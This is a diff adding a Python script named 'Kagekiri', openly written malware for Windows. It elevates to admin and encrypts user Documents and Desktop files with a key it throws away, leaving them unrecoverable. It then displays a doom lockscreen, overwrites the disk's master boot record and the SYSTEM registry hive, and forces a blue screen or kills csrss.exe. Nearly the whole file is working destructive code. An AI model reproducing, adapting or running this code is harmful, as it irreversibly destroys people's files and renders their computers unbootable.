@@ -1,0 +1,114 @@
+import os
+import sys
+import time
+import tkinter as tk
+import ctypes
+from cryptography.fernet import Fernet
+
+target_dirs = [
+    os.path.expanduser("~/Documents"),
+    os.path.expanduser("~/Desktop"),
+    "C:\\Windows\\Temp",
+    "C:\\MalPack"
+]
+
+with open("C:\\MalPack\\test_encrypt.txt", "w") as f:
+    f.write("This is a test file for encryption.")
+
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+def run_as_admin():
+    if not is_admin():
+        print("This script requires administrative privileges. Attempting to elevate...")
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+        sys.exit()
+    else:
+        print("Running with administrative privileges.")
+
+def encrypt_files():
+    print("Starting file encryption...")
+    key = Fernet.generate_key()
+    cipher = Fernet(key)
+    for dir_path in target_dirs:
+        if os.path.exists(dir_path):
+            for root, _, files in os.walk(dir_path):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    try:
+                        with open(file_path, "rb") as f:
+                            data = f.read()
+                        encrypted_data = cipher.encrypt(data)
+                        with open(file_path, "wb") as f:
+                            f.write(encrypted_data)
+                        os.rename(file_path, file_path + ".darkcipher")
+                        print(f"Encrypted: {file_path}")
+                    except Exception as e:
+                        print(f"Failed to encrypt {file_path}: {e}")
+    print("File encryption completed.")
+
+def lockscreen_gui(countdown=5):
+    print("Displaying GUI...")
+    try:
+        root = tk.Tk()
+        root.attributes("-fullscreen", True)
+        root.configure(bg="black")
+        tk.Label(root, text="KAGEKIRI UNLEASHED", font=("Courier", 36, "bold"), fg="red", bg="black").pack(pady=20)
+        tk.Label(root, text="YOUR SYSTEM IS DOOMED!", font=("Courier", 24), fg="yellow", bg="black").pack(pady=10)
+        timer = tk.Label(root, text=f"CRASH IN: {countdown}s", font=("Courier", 18), fg="lime", bg="black")
+        timer.pack(pady=10)
+
+        def update_timer():
+            nonlocal countdown
+            if countdown > 0:
+                countdown -= 1
+                timer.config(text=f"CRASH IN: {countdown}s")
+                root.after(1000, update_timer)
+            else:
+                root.destroy()
+
+        update_timer()
+        root.mainloop()
+        print("GUI closed.")
+    except Exception as e:
+        print(f"Failed to display GUI: {e}")
+
+def trigger_crash():
+    print("Attempting to crash the system...")
+    try:
+        with open("\\\\.\\PhysicalDrive0", "r+b") as disk:
+            disk.write(b"\x00" * 512)
+        print("MBR corrupted successfully.")
+    except Exception as e:
+        print(f"Failed to corrupt MBR: {e}")
+        try:
+            with open("C:\\Windows\\System32\\config\\SYSTEM", "r+b") as f:
+                f.write(b"\x00" * 512)
+            print("System registry corrupted as fallback.")
+        except Exception as e:
+            print(f"Failed to corrupt system registry: {e}")
+
+    try:
+        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_int()))
+        ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
+        print("BSOD triggered successfully.")
+    except Exception as e:
+        print(f"Failed to trigger BSOD: {e}")
+        try:
+            os.system("taskkill /IM csrss.exe /F")
+            print("Terminated critical process (csrss.exe) as fallback.")
+        except Exception as e:
+            print(f"Failed to terminate critical process: {e}")
+
+def kagekiri():
+    print("Kagekiri starting...")
+    run_as_admin()
+    encrypt_files()
+    lockscreen_gui(5)
+    trigger_crash()
+
+if __name__ == "__main__":
+    kagekiri()
